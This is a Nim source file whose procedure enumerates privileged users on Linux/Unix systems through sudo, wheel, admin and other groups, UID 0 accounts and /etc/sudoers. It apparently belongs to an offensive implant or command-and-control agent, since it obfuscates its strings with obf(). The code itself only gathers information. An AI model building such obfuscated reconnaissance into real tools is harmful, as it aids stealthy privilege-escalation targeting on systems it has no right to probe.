#[
    Cross-Platform getLocalAdm Command
    Get local administrators/privileged users on Linux/Unix systems
    Adapted from Windows version for Unix-like systems
]#

import osproc, strutils, os
import ../../util/strenc

proc getLocalAdm*(): string =
    try:
        var adminUsers: seq[string] = @[]
        
        when defined verbose:
            echo obf("DEBUG: Gathering local administrator information...")
        
        # Method 1: Check members of sudo group
        try:
            let sudoGroupOutput = execProcess("getent group sudo").strip()
            if sudoGroupOutput.len > 0:
                let sudoMembers = sudoGroupOutput.split(':')
                if sudoMembers.len >= 4 and sudoMembers[3].len > 0:
                    let users = sudoMembers[3].split(',')
                    for user in users:
                        adminUsers.add(obf("sudo: ") & user.strip())
        except:
            discard
            
        # Method 2: Check members of wheel group (common on Red Hat/CentOS)
        try:
            let wheelGroupOutput = execProcess("getent group wheel").strip()
            if wheelGroupOutput.len > 0:
                let wheelMembers = wheelGroupOutput.split(':')
                if wheelMembers.len >= 4 and wheelMembers[3].len > 0:
                    let users = wheelMembers[3].split(',')
                    for user in users:
                        adminUsers.add(obf("wheel: ") & user.strip())
        except:
            discard
            
        # Method 3: Check members of admin group (older Ubuntu)
        try:
            let adminGroupOutput = execProcess("getent group admin").strip()
            if adminGroupOutput.len > 0:
                let adminMembers = adminGroupOutput.split(':')
                if adminMembers.len >= 4 and adminMembers[3].len > 0:
                    let users = adminMembers[3].split(',')
                    for user in users:
                        adminUsers.add(obf("admin: ") & user.strip())
        except:
            discard
        
        # Method 4: Check root user
        try:
            let rootOutput = execProcess("getent passwd root").strip()
            if rootOutput.len > 0:
                adminUsers.add(obf("root: system administrator (UID 0)"))
        except:
            discard
            
        # Method 5: Check users with UID 0 (other than root)
        try:
            let uid0Output = execProcess("awk -F: '$3==0{print $1}' /etc/passwd").strip()
            let uid0Users = uid0Output.split('\n')
            for user in uid0Users:
                if user.strip() != "root" and user.strip().len > 0:
                    adminUsers.add(obf("UID 0: ") & user.strip() & obf(" (superuser)"))
        except:
            discard
            
        # Method 6: Check sudoers file for specific users (if readable)
        try:
            if fileExists("/etc/sudoers"):
                let sudoersContent = readFile("/etc/sudoers")
                let lines = sudoersContent.split('\n')
                for line in lines:
                    let trimmedLine = line.strip()
                    if not trimmedLine.startsWith("#") and "ALL=(ALL)" in trimmedLine:
                        let parts = trimmedLine.split()
                        if parts.len > 0:
                            let user = parts[0]
                            if user != "root" and user != "%sudo" and user != "%wheel" and user != "%admin":
                                adminUsers.add(obf("sudoers: ") & user)
        except:
            # Sudoers file typically not readable by regular users
            discard
            
        # Method 7: Check for users in other admin-related groups
        let adminGroups = ["adm", "operator", "staff"]
        for group in adminGroups:
            try:
                let groupOutput = execProcess("getent group " & group).strip()
                if groupOutput.len > 0:
                    let groupMembers = groupOutput.split(':')
                    if groupMembers.len >= 4 and groupMembers[3].len > 0:
                        let users = groupMembers[3].split(',')
                        for user in users:
                            adminUsers.add(group & obf(": ") & user.strip())
            except:
                discard
        
        # Remove duplicates while preserving order
        var uniqueAdmins: seq[string] = @[]
        for admin in adminUsers:
            var found = false
            for existing in uniqueAdmins:
                if admin.split(':')[1].strip() == existing.split(':')[1].strip():
                    found = true
                    break
            if not found:
                uniqueAdmins.add(admin)
        
        when defined verbose:
            echo obf("DEBUG: Found ") & $uniqueAdmins.len & obf(" privileged users")
        
        if uniqueAdmins.len > 0:
            return obf("Local administrators/privileged users:\n") & uniqueAdmins.join("\n")
        else:
            return obf("No privileged users found (insufficient permissions)")
        
    except Exception as e:
        when defined verbose:
            echo obf("DEBUG: getLocalAdm failed: ") & e.msg
        return obf("ERROR: Administrator enumeration failed - ") & e.msg 